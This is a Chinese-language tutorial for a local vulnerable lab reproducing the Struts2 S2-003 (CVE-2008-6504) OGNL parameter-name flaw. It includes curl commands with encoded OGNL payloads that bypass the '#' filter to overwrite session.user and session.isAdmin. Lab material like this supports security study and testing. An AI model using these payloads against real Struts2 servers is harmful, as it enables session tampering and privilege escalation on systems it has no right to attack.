# struts2-s2-003 操作教程

- 类型：单体靶场
- 目录：`struts2-s2-003`
- 端口：`9964`
- 推荐入口：`/index.action`

## 这是什么

Struts2 `S2-003 / CVE-2008-6504` 演示靶场，核心是参数名被当成 OGNL 路径解析，攻击者可以通过绕过 `#` 过滤直接污染服务器端上下文对象。

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9964` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过页面点击测试

1. 打开 `http://宿主机IP:9964/index.action`。
2. 先点 `执行官方 Payload`，默认会把 `session.user` 改成 `0wn3d`。
3. 再点 `设置 isAdmin=true`，观察页面状态区里的 `session.isAdmin` 是否变化。
4. 如需还原环境，点击 `清空 Session`。

## 方式二：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `struts2_s2_003、s2-003、struts2` 过滤到当前项目。
3. 推荐先跑 `struts2_s2_003_attack_user`，再跑 `struts2_s2_003_attack_admin`。
4. 最后跑 `struts2_s2_003_normal` 看基线页面。

推荐直接使用的首页条目：
- `struts2_s2_003_attack_user`：污染 `session.user`
- `struts2_s2_003_attack_admin`：污染 `session.isAdmin`
- `struts2_s2_003_normal`：基线访问

## 方式三：直接访问接口测试

1. 污染 `session.user`：

```bash
curl -i "http://宿主机IP:9964/index.action?%28%27%5Cu0023%27%20%2B%20%27session%5C%27user%5C%27%27%29%28unused%29=0wn3d"
```

2. 污染 `session.isAdmin`：

```bash
curl -i "http://宿主机IP:9964/index.action?%28%27%5Cu0023%27%20%2B%20%27session%5B%5C%27isAdmin%5C%27%5D%27%29%28unused%29=true"
```

3. 基线访问：

```bash
curl -i "http://宿主机IP:9964/index.action"
```

## 测试时重点看什么

1. 页面是否能正常渲染状态区。
2. `session.user` 和 `session.isAdmin` 是否被 GET 参数名直接修改。
3. 清空后再次访问，状态是否恢复为未设置。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
